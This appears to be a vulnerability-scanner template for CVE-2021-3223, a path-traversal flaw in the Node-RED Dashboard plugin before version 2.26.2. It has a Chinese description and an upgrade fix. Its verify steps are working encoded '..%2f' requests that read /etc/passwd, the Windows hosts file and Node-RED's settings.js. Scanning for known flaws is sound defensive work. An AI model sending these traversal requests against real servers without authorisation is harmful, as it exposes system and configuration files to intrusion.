app: Node-RED
query: app:"Node-RED"
meta:
    name: CVE-2021-3223 Node-RED 任意文件读取
    level: 4
    tags:
        - file_read
    description: |-
        Node-RED由于未对url中传输的路径进行严格过滤, 导致攻击者可构造特殊路径进行任意文件读取
            Node-Red-Dashboard version < 2.26.2
            (Node-Red插件Node-Red-Dashboard, 如果未安装此插件, 或插件版本高于2.26.2, 则不受影响)
    homepage: https://nodered.org/
    author: Prism X
    references: https://blog.csdn.net/weixin_51387754/article/details/121532015
    solution: 版本升级>2.26.2
    create_at: "2023-10-09 18:01:22"
    available: false
    steps:
        variable: []
        verify_steps:
            type: or
            verify:
                - request:
                    method: GET
                    path: /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
                    redirect: false
                    header: []
                    params: ""
                  response:
                    - name: code
                      value: "200"
                      type: equals
                    - name: body
                      value: To password protect the Node-RED editor and admin API
                      type: contains
                - request:
                    method: GET
                    path: /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fC:%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts
                    redirect: false
                    header: []
                    params: ""
                  response:
                    - name: code
                      value: "200"
                      type: equals
                    - name: body
                      value: To password protect the Node-RED editor and admin API
                      type: contains
                - request:
                    method: GET
                    path: /js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
                    redirect: false
                    header: []
                    params: ""
                  response:
                    - name: code
                      value: "200"
                      type: equals
                    - name: body
                      value: To password protect the Node-RED editor and admin API
                      type: contains
                - request:
                    method: GET
                    path: /js/..%2f..%2f..%2f..%2fsettings.js
                    redirect: false
                    header: []
                    params: ""
                  response:
                    - name: code
                      value: "200"
                      type: equals
                    - name: body
                      value: To password protect the Node-RED editor and admin API
                      type: contains
        exploit_steps:
            type: ""
            params:
                name: ""
                type: input
                value: ""
